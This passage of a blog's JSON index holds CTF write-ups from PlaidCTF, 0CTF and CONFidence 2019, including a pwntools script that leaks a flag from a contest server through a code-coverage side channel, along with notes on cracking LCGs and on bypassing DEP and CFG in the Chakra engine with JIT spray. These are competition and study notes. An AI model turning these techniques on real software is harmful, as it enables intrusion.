;done","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]},{"title":"2019::PlaidCTF","slug":"2019-PlaidCTF","date":"2019-05-01T13:50:47.000Z","updated":"2019-05-02T03:50:58.000Z","comments":true,"path":"en/2019-PlaidCTF/","permalink":"http://blog.terrynini.tw/en/2019-PlaidCTF/","excerpt":"Played with Balsn, and get 4th this time.I have to construct my payload more carefully, wasted too much time on debugging. This is not a writeup for reading, just a kind of reminder for myself.","text":"Played with Balsn, and get 4th this time.I have to construct my payload more carefully, wasted too much time on debugging. This is not a writeup for reading, just a kind of reminder for myself. Misc::space saverSolution1 binwalk --dd=&quot;.*&quot; space.dd formost would extract the same png, but missing the most important part !! The password of rar is concated after the keyword IEND of each png Solution2 mount the dd mount -o loop space.dd /mnt/tmp scan for searching deleted files Misc::can you guess meintuitive solutionalso my solution print(vars()) error basethis is interesting help(flag) intended solutionItâ€™s persuasive, because exec link Misc::Project EulerntFactor + random permutation and greedyThis should be more efficiency ï¼Ÿ Factor + dfsThis is the first thought came to my mind, did not find this solution on CTFtimeâ€™s wirteup.But the writeup released by team ranked 2nd and 3rd are this kind.","categories":[{"name":"Reminder","slug":"Reminder","permalink":"http://blog.terrynini.tw/categories/Reminder/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Plaid","slug":"Plaid","permalink":"http://blog.terrynini.tw/tags/Plaid/"}]},{"title":"TIL::æ”»æ“ŠLCG(ç·šæ€§åŒé¤˜ç”Ÿæˆå™¨)","slug":"TIL-æ”»æ“ŠLCG-ç·šæ€§åŒé¤˜ç”Ÿæˆå™¨","date":"2019-04-01T04:18:45.000Z","updated":"2019-04-01T13:24:28.000Z","comments":true,"path":"tw/TIL-æ”»æ“ŠLCG-ç·šæ€§åŒé¤˜ç”Ÿæˆå™¨/","permalink":"http://blog.terrynini.tw/tw/TIL-%E6%94%BB%E6%93%8ALCG-%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E7%94%9F%E6%88%90%E5%99%A8/","excerpt":"p4: https://tailcall.net/blog/cracking-randomness-lcgs/paper: https://www.pnas.org/content/pnas/61/1/25.full.pdf","text":"p4: https://tailcall.net/blog/cracking-randomness-lcgs/paper: https://www.pnas.org/content/pnas/61/1/25.full.pdf å¯¦ç”¨æ–¹é¢ï¼Œp4 æåˆ°ï¼Œåœ¨ LCG å…§éƒ¨åƒæ•¸æœªçŸ¥çš„æƒ…æ³æ™‚ï¼Œç²å–è¶³å¤ çš„äº‚æ•¸è¼¸å‡ºï¼Œå¯ä»¥é€†ç®—å›æ¨æ‰€æœ‰çš„åƒæ•¸ã€‚è€Œ paper æåˆ°ï¼Œé€™ç¨® LCG æ‰€ç”¢ç”Ÿçš„äº‚æ•¸å…¶å¯¦ä¸¦æ²’æœ‰å¾ˆäº‚ï¼Œå¾ç”¢ç”Ÿçš„åºåˆ—ä¸­æŠ“å›ºå®šé•·åº¦çš„æ•¸å­—ç•¶åšé«˜ç¶­åº¦çš„é»ï¼Œå¯ä»¥è¢«è­‰æ˜å…¶å¯¦é€™äº›é«˜ç¶­åº¦çš„é»ï¼Œæœƒå‡ºç¾åœ¨ç‚ºæ•¸ä¸å¤šçš„ hyperplane ä¸Šé¢ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæ†‘ LCG æ‰€åšå‡ºä¾†çš„è’™åœ°å¡ç¾…æ–¹æ³•å¯èƒ½ä¸å¤ å¥½ï¼Œå› ç‚ºäº‹å¯¦ä¸Šé€™äº›äº‚æ•¸ä¸¦ä¸å¤ äº‚ã€‚","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"Cryptography","slug":"Cryptography","permalink":"http://blog.terrynini.tw/tags/Cryptography/"}]},{"title":"2019::0CTF::Quals::Sanitize","slug":"2019-0CTF-Quals-Sanitize","date":"2019-03-27T11:47:48.000Z","updated":"2019-03-27T13:07:54.000Z","comments":true,"path":"en/2019-0CTF-Quals-Sanitize/","permalink":"http://blog.terrynini.tw/en/2019-0CTF-Quals-Sanitize/","excerpt":"Play with Balsn this time and got 12th place, teamates are really amazing.I just slept late at the weekendâ€¦, there was only a reverse challenge left â€¦Though, they release the sixology on the last day, we almost solve that, but I did not notice that the compare operation in the bubble sort is lexicographicallyâ€¦.","text":"Play with Balsn this time and got 12th place, teamates are really amazing.I just slept late at the weekendâ€¦, there was only a reverse challenge left â€¦Though, they release the sixology on the last day, we almost solve that, but I did not notice that the compare operation in the bubble sort is lexicographicallyâ€¦. TL;DRbinary search &#123;&#125;cmp_char_here3guess_position_here 4 47 flag&#123;fr0M_C0vEr4ge_To_Fl4G_And_Enj0Y_0cTF_2Ol9!&#125; detailThe binary expects us to input a string , and pick some characters from the flag string, then the binary would perform sorting on these characters. At the end of the binary, it prints out the record of itâ€™s code coverage. Which means that we may recover the control flow of binary from these information which sounds difficult. And the key point is what kind of sorting was implemented in the binary. The below is the detail of the sorting implemented in the binary, take input as 123\\n3\\n1 2 5\\n for example, which means that take the char at flag[1],flag[2],flag[5], and sort these chars with string 123 together. (Newline would affect the code coverage) The user input 123 would be processed first, then the characters from flag string. And the phases of sorting can be summarize as follow : Build up a List Build a charObject which has sub_list,sub_list_len,char_value,next,parent Insert the charObject to the List base on the value of sub_list_len,which should initialize as0. If there were already some objects with 0 sub_list_len,the new object would be inserted at the tail of them (itâ€™s actually not the length, just for convenience) Compare last two object at row of charObject with same sub_list_len value The bigger one would be put into the sublist of the other one Go back to 2. if there are still chars remaining. So, it look like input :12331 2 5#Assume that the flag at remote is &#x27;flag&#123;???????????&#125;&#x27;List -&gt; null List -&gt; &#x27;1&#x27;List -&gt; &#x27;1&#x27; -&gt; &#x27;2&#x27;List -&gt; &#x27;1&#x27; | &#x27;2&#x27; List -&gt; &#x27;3&#x27; -&gt; &#x27;1&#x27; | &#x27;2&#x27; List -&gt; &#x27;l&#x27; -&gt; &#x27;3&#x27; -&gt; &#x27;1&#x27; | &#x27;2&#x27; List -&gt; &#x27;3&#x27; -&gt; &#x27;1&#x27; | | &#x27;l&#x27; &#x27;2&#x27; List -&gt; &#x27;a&#x27; -&gt; &#x27;1&#x27; | &#x27;2&#x27; | &#x27;3&#x27; | &#x27;l&#x27; List -&gt; &#x27;a&#x27; -&gt; unknown_char -&gt; &#x27;1&#x27; | &#x27;2&#x27; | &#x27;3&#x27; | &#x27;l&#x27; At this point, the last char, which is flag[5] would be compare with char a, according to the result (&gt; or &lt;&#x3D;), the binary would give us two different code coverage, but the problem here is we can only compare the last char,flag[4] here, with the other char , flag[1] ==&#39;a&#39; here , which was also from flag string. If we change the order of the input slightly: 12335 1 2 Now we can compare the unknown char from string with our input, but the new problem is the code coverage is implemented by a bunch of counter, the flow after this compare may cause them looks the same. So we have to construct a string which make the binary branch predictable. That is : &#123;&#125;A35 4 47 The flag[4] and flag[47] are &#123; and &#125; respectively, this input make the path of sorting more predictable due to&#123; and &#125; are almost bigeer than all ascii. The fun fact here is the last char of flag is \\n. exploit12345678910111213141516171819202122232425262728293031from pwn import *import stringcontext.log_level =&#x27;error&#x27;charset = sorted(list(string.printable[:-5]))flag = []def bsearch(idx,pos): p = remote(&quot;111.186.63.16&quot;,20193) p.sendline(&quot;&#123;&#125;&quot;+charset[idx]) p.send(&quot;3\\n&quot;+str(k)+&quot;\\n4\\n47\\n&quot;) ret = p.recv() p.close() return retfor k in range(5,47): lower = 0 upper = len(charset)-1 l_st= bsearch(lower, k) u_st = bsearch(upper, k) while lower &lt; upper: mid = (lower+upper)/2 if (bsearch(mid,k) == l_st): lower = mid + 1 else: upper = mid flag.append(charset[lower-1]) print &quot;flag&#123;&quot;+&#x27;&#x27;.join(flag)+&quot;&#125;&quot;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"0CTF","slug":"0CTF","permalink":"http://blog.terrynini.tw/tags/0CTF/"}]},{"title":"TIL::åˆ©ç”¨ Chakra JIT ç¹é DEP å’Œ CFG","slug":"TIL-åˆ©ç”¨-Chakra-JIT-ç¹é-DEP-å’Œ-CFG","date":"2019-03-17T14:46:16.000Z","updated":"2019-03-17T16:18:24.000Z","comments":true,"path":"tw/TIL-åˆ©ç”¨-Chakra-JIT-ç¹é-DEP-å’Œ-CFG/","permalink":"http://blog.terrynini.tw/tw/TIL-%E5%88%A9%E7%94%A8-Chakra-JIT-%E7%B9%9E%E9%81%8E-DEP-%E5%92%8C-CFG/","excerpt":"åŸæ–‡","text":"åŸæ–‡ JIT Sprayé€éè®“ JIT ç·¨è­¯æŸäº›è¨­è¨ˆéçš„æŒ‡ä»¤ï¼Œåœ¨è¨˜æ†¶é«”ä¸­æ§‹é€ å‡ºæƒ³è¦çš„ shellcodeã€‚ ç·©è§£çš„æ–¹æ³•æ˜¯åˆ©ç”¨éš¨æ©Ÿç”Ÿæˆçš„ key åŠ å¯†å¸¸æ•¸ï¼Œè€Œ Chakra ä¹Ÿæœƒéš¨æ©Ÿæ’å…¥æŒ‡ä»¤ã€‚ ä¸Šæ¬¡ä¸€å€‹é«˜ä¸­ç”Ÿåœ¨ Chakra ä¸Šæ‰¾åˆ°çš„æ´æœ‰ä¸€éƒ¨åˆ†ä¹Ÿè·Ÿå¸¸æ•¸çš„åŠ å¯†æœ‰é—œï¼Œåœ¨æŸäº›æ™‚å€™å…¶å¯¦ JIT æ²’æœ‰çœŸçš„éš¨æ©Ÿç”Ÿæˆ key https://en.wikipedia.org/wiki/JIT_spraying CFGåŸºæœ¬ä¸Šå°±æ˜¯å°‡ç·¨è­¯å¾Œçš„ function å…¥å£çš„è¨˜æ†¶é«”ä½ç½®å£“ç¸®æˆä¸€å€‹ bitmap æ–¹ä¾¿æŸ¥è¡¨ï¼Œå¦‚æœåœ¨è¡¨ä¸Šæ˜¯1è¡¨ç¤ºæ˜¯å¯ä¿¡è³´çš„ function å…¥å£ï¼Œå¦å‰‡å°±ç•¶ä½œæ˜¯å¾Œä¾†è¢«æƒ¡æ„ç”¢ç”Ÿçš„ã€‚ å¯¦ä½œç´°ç¯€ https://www.anquanke.com/post/id/85493 https://xz.aliyun.com/t/2587 åŸæ–‡æ‘˜è¦åœ¨ Chakra ä¸­ JIT Spray çš„é˜²ç¦¦æªæ–½ï¼Œæ˜¯åœ¨å¸¸æ•¸å¤§å°å¤§æ–¼ 2 bytes æ™‚æ‰æœƒä½œç”¨ï¼Œä½†æ˜¯å¯ä»¥åœ¨é™£åˆ—è³¦å€¼çš„æŒ‡ä»¤ä¸­æŠŠåç§»ä¹Ÿç•¶ä½œæ˜¯ JIT Sprayçš„ä¸€éƒ¨ä»½ï¼Œå› æ­¤ç¹éäº† DEPã€‚ä½†æ˜¯å› ç‚ºç”±æ­¤ç”Ÿæˆçš„ shellcode å…¥å£ä¸¦æ²’æœ‰è¢«è¨˜éŒ„åœ¨ CFG è¡¨ä¸Šï¼Œæ‰€ä»¥é‚„æ˜¯æœƒè¢«æ“‹ä¸‹ä¾†ï¼Œè€Œç¹éçš„æ–¹æ³•æ˜¯ï¼ŒChakra æœ¬èº«åœ¨æ­£å¸¸ä½¿ç”¨ JIT çš„æ™‚å€™ï¼Œä¸€å®šæœƒå‹•æ…‹ç”Ÿæˆç·¨è­¯å¥½çš„ function ï¼Œé‚£ Chakra åˆæ˜¯æ€æ¨£é€šé CFG çš„å‘¢ï¼Ÿ Chakra é€éä¸€å€‹æ—©å°±å¯«å¥½çš„ function å…¥å£ï¼ˆæ‰€ä»¥æœ‰è¨˜éŒ„åœ¨ CFG è¡¨ä¸Šï¼‰ä¾†è·³åˆ°é‚£äº› JIT å‹•æ…‹ç·¨è­¯çš„ function ä¸­ï¼Œå› æ­¤å¯ä»¥è—‰æ­¤è·³æ¿ä¾†è·³åˆ°å‰›æ‰ JIT Spray æ§‹é€ çš„ shellcode ä¸Šã€‚","categories":[{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"}],"tags":[{"name":"browser","slug":"browser","permalink":"http://blog.terrynini.tw/tags/browser/"},{"name":"Chakra","slug":"Chakra","permalink":"http://blog.terrynini.tw/tags/Chakra/"},{"name":"JIT","slug":"JIT","permalink":"http://blog.terrynini.tw/tags/JIT/"}]},{"title":"2019::CONFidence","slug":"2019-CONFidence","date":"2019-03-17T12:55:13.000Z","updated":"2019-04-04T13:13:02.000Z","comments":true,"path":"en/2019-CONFidence/","permalink":"http://blog.terrynini.tw/en/2019-CONFidence/","excerpt":"Teaching CPR during the contest, so I decided to spend the next few day to sovle these challenges without looking writeups.","text":"Teaching CPR during the contest, so I decided to spend the next few day to sovle these challenges without looking writeups. Reverse::ElementaryTL;DRSolve this with angr is quick and easy solver.pyimport angrimport claripyf = open(&quot;./elementary&quot;,&quot;r&quot;).read()r = []a = 0find = 0x40077fwhile True: #find all the # mov eax,0 # jmp xxxxxx p = f.find(&quot;\\xB8\\x00\\x00\\x00\\x00\\xE9&quot;,a+1) if a == -1: break r.append(a+0x400000)p = angr.Project(&quot;./elementary&quot;)flag_chars = [claripy.BVS(&#x27;flag_%d&#x27; % i, 8) for i in range(104)]flag = claripy.Concat(*flag_chars)st = p.factory.blank_state(stdin=flag)simgr = p.factory.simgr(st)simgr.explore(avoid=tuple(r),find=find)print simgr.found[0].posix.dumps(0) flag:p4&#123;I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually&#125; detailsThe binary has lots of trivial functions, some of them return the arg1 directly, the others return arg1^1, this prevents us from parsing the decompile result directly. The angr help us to solve this challenge without knowing anything about those functions. The other option to solve this is to laverage idapython to parse the decompile result directly, I used to do so. Reverse::Old schoolpseudo codelogic.pydef sub_10148(): position = 0x50 for i in range(9): input = input(&quot;hex&quot;) input = int(input,16) # column direction if input &amp; 1 = 1 if position is 0 or position%18 != 16: #18 is the chars number in a row position += 1 if !(input &amp; 1) if position is not 0 or position%18 != 0: position -= 1 # row direction if input &amp; 2: if position &lt; 0x8f: #0xa1/18 is the total rows of the output position += 18 if !(input &amp; 2): position &gt; 17: position -= 18 input = input &gt;&gt; 2 # process next to bits of user input memory[position] +=1def sub_10215(): string = &quot;p4&#123;krule_ctf&#125;&quot; position = 0 for i in range(0xa1): if array[memory[position]] &gt; 0xd: bl = 0x5e else: bl = string[memory[position]+0xbc] memory[position] = bl position += 1 detailsThe binary ask for 18 hexadecimal digits to draw a graph. Every two of them will be consider as a number, eg: 1a &#x3D; $26_{10}$. Then, for each number, every two bits of them indicate a way to move on a 2D-array on memory. So, at the end of the funciton sub_10148, the data in 2D-array implys that how much times we walk on to a corresponding position. What sub_10215 does is replace the number in array to the corresponding character in string p4&#123;krule_ctf&#125;. And S and E in the flag.txt means the start point and the end point. In summary, all we need to do is to find a way to move from S to E and also satify all the numbers marked on each position. Backtracking is a good choice, but I drew it on paper. original-array 2 3211 1 3423 E 1 2213 1 2 1 SMy solution is : â†–â†–â†—â†— â†˜â†™â†™â†— â†˜â†—â†–â†– â†˜â†—â†˜â†– â†˜â†—â†–â†– â†—â†™â†™â†— â†™â†—â†˜â†– â†˜â†—â†™â†— â†—â†™â†˜â†— Hexadecimal solution is 50 6b 07 37 07 69 36 67 79 (there should be no space in input) Reverse::PudliszkidetailsThis challange gives us a .jar, after decompile, there is a package call kotlin inside it, itâ€™s another language designed for JVM, Iâ€™ve never heard of it â€¦, the result of decompiler looks like a mess â€¦. , and there are some weird class like p.class,&#123;.class, &#125;.class. Itâ€™s obviously would be use to verify the flag later. Take a look on main first : FlagCheckerKt.classpublic final class FlagCheckerKt&#123; public static final void main(@NotNull String[] args) &#123; Intrinsics.checkParameterIsNotNull(args, &quot;args&quot;); String[] $receiver = args; int $i$a$-with-FlagCheckerKt$main$1 = 0; SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class); if ((localSizeResult instanceof Correct)) &#123; String str1; if (validateFlag($receiver[0]) == 0) &#123; str1 = &quot;Nice!&quot;;System.out.print(str1); &#125; else &#123; str1 = &quot;Not today&quot;;System.out.print(str1); int i = -1;System.exit(i);throw ((Throwable)new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;)); &#125; &#125; else if ((localSizeResult instanceof Incorrect)) &#123; String str2 = &quot;Failed&quot;;System.out.print(str2); int j = -1;System.exit(j);throw ((Throwable)new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;)); &#125; &#125; SizeResult localSizeResult = SizeResultFactory.Companion.check($receiver.length, A.class);, this line checks the number of args equals to the length of the name of class A or not. Then, call validateFlag to verify the arg. The decompiled result of validFlag is a mess, need patience to read it, and try to write a couple lines of kotlin. Basically, what validFlag does is : Turn the flag into a list of tuple, eg: String &quot;abab&quot; -&gt; List [(a,0),(b,1),(a,2),(b,3)] Group the list from step 1 according to the first in each tuple, eg: List [(a,0),(b,1),(a,2),(b,3)] -&gt; LinkedHashMap &#123;a=[0,2],b=[1,3]&#125; Call checksum to do some caculation on the LinkedHashMap from step 2 Follow into the function checksum : Call compress to compress the list in LinkedHashMap. LinkedHashMap &#123;a=[0,2],b=[1,3]&#125; -&gt; Collection &#123;(a.class object instance, 0*1+2*32),(b,calss object instance, 1*1+3*32)&#125; Do some caculate according to the first of each tuple and append it to a temp Collection. Apply sum on the Collection and return the result, which should be 0 The caculate in step 2 is : localObject3 = Integer.valueOf(($i$a$-map-FlagCheckerKt$checksum$1 instanceof &#125;) ? ((Number)entry.getSecond()).intValue() - 27 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof _) ? ((Number)entry.getSecond()).intValue() - 19849 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof u) ? ((Number)entry.getSecond()).intValue() - 25 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof t) ? ((Number)entry.getSecond()).intValue() - 5 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof s) ? ((Number)entry.getSecond()).intValue() - 11 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof n) ? ((Number)entry.getSecond()).intValue() - 8 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof l) ? ((Number)entry.getSecond()).intValue() - 486 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof k) ? ((Number)entry.getSecond()).intValue() - 643 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof i) ? ((Number)entry.getSecond()).intValue() - 16 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof h) ? ((Number)entry.getSecond()).intValue() - 786 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof e) ? ((Number)entry.getSecond()).intValue() - 21 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof c) ? ((Number)entry.getSecond()).intValue() - 23 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 7) ? ((Number)entry.getSecond()).intValue() - 22 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 5) ? ((Number)entry.getSecond()).intValue() - 17 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 1) ? ((Number)entry.getSecond()).intValue() - 327 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 0) ? ((Number)entry.getSecond()).intValue() - 452 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof &#123;) ? ((Number)entry.getSecond()).intValue() - 2 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof 4) ? ((Number)entry.getSecond()).intValue() - 1 : ($i$a$-map-FlagCheckerKt$checksum$1 instanceof p) ? ((Number)entry.getSecond()).intValue() - 27040 : 64199); Get the flag by factorizing those number. flag:p4&#123;k0tl1n_1s_p0li5h_ke7chup&#125; Reverse::WatchmemThe binary fork itself by createprocess, then it would try to act like a debugger. When the children return a singal single step or signal illegal instrution, it will decode the real instructions and put it back, and recover it after execution.Itâ€™s time comsuming to fully understand the mechanism, I try to analyze the pattern by hook WriteProcessMemory,which can be done by dll injection or debugger script. This is the snippet of result : 0x401e69 2 #patch 0x401e69 0x401e69+10xc9 0x8d #change the bytes to 0xc9 0x8d0x401e69 160x55 0x95 0xa9 0xbd 0x94 0x10 0xb1 0xe 0x8 0x28 0x96 0x55 0xca 0xb0 0xc3 0xb 0x401e69 160xc9 0x8d 0x31 0x9b 0x2a 0x56 0x57 0x12 0x7a 0xb0 0x72 0x15 0xfe 0x36 0x4d 0x4f 0x401e69 20xf 0xb0x401e6a 10x95 It turns out that the second records always be the decoded instruction. So, all we need to do is patch it by IDApython ida.pydef go_patch(patch): for i in patch: ea = int(i[0],16) p = i[1].split(&quot; &quot;) for k in range(len(p)): idc.PatchByte( ea+k , int(p[k],16))patch = [[&#x27; 00401E69&#x27;, &#x27;c9&#x27;], [&#x27; 00401E6A&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401E6C&#x27;, &#x27;83 ec 48&#x27;], [&#x27; 00401E6F&#x27;, &#x27;c7 04 24 cc a0 43 00&#x27;], [&#x27; 00401E76&#x27;, &#x27;e8 c9 4f 03 00 d5 23 64 9d e8 fa de 8d 34 9a 05&#x27;], [&#x27; 00436E44&#x27;, &#x27;&#x27;], [&#x27; 00401E7B&#x27;, &#x27;8d 45 d6&#x27;], [&#x27; 00401E7E&#x27;, &#x27;89 44 24 04&#x27;], [&#x27; 00401E82&#x27;, &#x27;c7 04 24 2f a1 43 00&#x27;], [&#x27; 00401E89&#x27;, &#x27;e8 ae 4f 03 00 d5 23 69 41 28 15 78 b0 58 4d 07&#x27;], [&#x27; 00436E3C&#x27;, &#x27;&#x27;], [&#x27; 00401E8E&#x27;, &#x27;a1 a8 d1 43 00&#x27;], [&#x27; 00401E93&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E96&#x27;, &#x27;e8 e9 4f 03 00 d5 23 64 9d 28 fa 9c c2 c1 9d cb&#x27;], [&#x27; 00436E84&#x27;, &#x27;&#x27;], [&#x27; 00401E9B&#x27;, &#x27;8d 45 d6&#x27;], [&#x27; 00401E9E&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401EA1&#x27;, &#x27;&#x27;], [&#x27; 00401E30&#x27;, &#x27;55&#x27;], [&#x27; 00401E31&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401E33&#x27;, &#x27;83 ec 28&#x27;], [&#x27; 00401E36&#x27;, &#x27;c7 45 f4 a8 a0 43 00&#x27;], [&#x27; 00401E3D&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401E40&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E43&#x27;, &#x27;&#x27;], [&#x27; 00401E09&#x27;, &#x27;55&#x27;], [&#x27; 00401E0A&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401E0C&#x27;, &#x27;83 ec 14&#x27;], [&#x27; 00401E0F&#x27;, &#x27;c7 45 fc 00 00 00 00&#x27;], [&#x27; 00401E16&#x27;, &#x27;eb 0f 8f a5 22 b9 26 d0 c0 60 3b e1 1f 55 fb d4&#x27;], [&#x27; 00401E27&#x27;, &#x27;83 7d fc 0f&#x27;], [&#x27; 00401E2B&#x27;, &#x27;&#x27;], [&#x27; 00401E18&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401E1B&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401E1E&#x27;, &#x27;&#x27;], [&#x27; 00401DDF&#x27;, &#x27;55&#x27;], [&#x27; 00401DE0&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401DE2&#x27;, &#x27;83 ec 04&#x27;], [&#x27; 00401DE5&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401DE8&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401DEB&#x27;, &#x27;&#x27;], [&#x27; 00401C20&#x27;, &#x27;55&#x27;], [&#x27; 00401C21&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401C23&#x27;, &#x27;53&#x27;], [&#x27; 00401C24&#x27;, &#x27;83 ec 10&#x27;], [&#x27; 00401C27&#x27;, &#x27;c7 45 f4 10 a0 43 00&#x27;], [&#x27; 00401C2E&#x27;, &#x27;c7 45 f8 00 00 00 00&#x27;], [&#x27; 00401C35&#x27;, &#x27;eb 28 8f a5 32 b7 e5 ec a7 4c ab c4 92 d9 b1 d8&#x27;], [&#x27; 00401C5F&#x27;, &#x27;83 7d f8 1f&#x27;], [&#x27; 00401C63&#x27;, &#x27;&#x27;], [&#x27; 00401C37&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401C3A&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C3D&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C3F&#x27;, &#x27;0f b6 18&#x27;], [&#x27; 00401C42&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401C45&#x27;, &#x27;8b 45 f4&#x27;], [&#x27; 00401C48&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C4A&#x27;, &#x27;0f b6 08&#x27;], [&#x27; 00401C4D&#x27;, &#x27;8b 55 f8&#x27;], [&#x27; 00401C50&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C53&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C55&#x27;, &#x27;31 cb&#x27;], [&#x27; 00401C57&#x27;, &#x27;89 da&#x27;], [&#x27; 00401C59&#x27;, &#x27;88 10&#x27;], [&#x27; 00401C5B&#x27;, &#x27;83 45 f8 01&#x27;], [&#x27; 00401C5F&#x27;, &#x27;0f 0b a6 5d a0 44&#x27;], [&#x27; 00401C65&#x27;, &#x27;90&#x27;], [&#x27; 00401C66&#x27;, &#x27;83 c4 10&#x27;], [&#x27; 00401C69&#x27;, &#x27;5b&#x27;], [&#x27; 00401C6A&#x27;, &#x27;5d&#x27;], [&#x27; 00401C6B&#x27;, &#x27;c3 17 83 53 05 e4 e8 8f 5f 0e 33 a0 6a 10 47 5f&#x27;], [&#x27; 00401DF0&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401DF3&#x27;, &#x27;89 04 24&#x27;], [&#x27; 00401DF6&#x27;, &#x27;&#x27;], [&#x27; 00401C6C&#x27;, &#x27;55&#x27;], [&#x27; 00401C6D&#x27;, &#x27;89 e5&#x27;], [&#x27; 00401C6F&#x27;, &#x27;83 ec 10&#x27;], [&#x27; 00401C72&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C75&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401C78&#x27;, &#x27;88 45 fb&#x27;], [&#x27; 00401C7B&#x27;, &#x27;c7 45 fc 00 00 00 00&#x27;], [&#x27; 00401C82&#x27;, &#x27;eb 36 8f a5 2e b7 e5 ec a7 4c ab c4 aa a4 1e cc&#x27;], [&#x27; 00401CBA&#x27;, &#x27;83 7d fc 1e&#x27;], [&#x27; 00401CBE&#x27;, &#x27;&#x27;], [&#x27; 00401C84&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401C87&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C8A&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C8C&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401C8F&#x27;, &#x27;c0 e8 04&#x27;], [&#x27; 00401C92&#x27;, &#x27;89 c1&#x27;], [&#x27; 00401C94&#x27;, &#x27;8b 45 fc&#x27;], [&#x27; 00401C97&#x27;, &#x27;8d 50 01&#x27;], [&#x27; 00401C9A&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401C9D&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401C9F&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401CA2&#x27;, &#x27;0f b6 c0&#x27;], [&#x27; 00401CA5&#x27;, &#x27;c1 e0 04&#x27;], [&#x27; 00401CA8&#x27;, &#x27;09 c1&#x27;], [&#x27; 00401CAA&#x27;, &#x27;8b 55 fc&#x27;], [&#x27; 00401CAD&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401CB0&#x27;, &#x27;01 d0&#x27;], [&#x27; 00401CB2&#x27;, &#x27;89 ca&#x27;], [&#x27; 00401CB4&#x27;, &#x27;88 10&#x27;], [&#x27; 00401CB6&#x27;, &#x27;83 45 fc 01&#x27;], [&#x27; 00401CBA&#x27;, &#x27;0f 0b a2 5e a0 52&#x27;], [&#x27; 00401CC0&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401CC3&#x27;, &#x27;83 c0 1f&#x27;], [&#x27; 00401CC6&#x27;, &#x27;0f b6 00&#x27;], [&#x27; 00401CC9&#x27;, &#x27;c0 e8 04&#x27;], [&#x27; 00401CCC&#x27;, &#x27;89 c2&#x27;], [&#x27; 00401CCE&#x27;, &#x27;0f b6 45 fb&#x27;], [&#x27; 00401CD2&#x27;, &#x27;c1 e0 04&#x27;], [&#x27; 00401CD5&#x27;, &#x27;09 c2&#x27;], [&#x27; 00401CD7&#x27;, &#x27;8b 45 08&#x27;], [&#x27; 00401CDA&#x27;, &#x27;83 c0 1f&#x27;], [&#x27; 00401CDD&#x27;, &#x27;88 10&#x27;], [&#x27; 00401CDF&#x27;, &#x27;90&#x27;], [&#x27; 00401CE0&#x27;, &#x27;c9&#x27;], [&#x27; 00401CE1&#x27;, &#x27;c3 17 83 53 07 e4 38 78 a0 d0 7b 11 7a aa e8 d1&#x27;], [&#x27; 00401DFB&#x27;, &#x27;8b 45 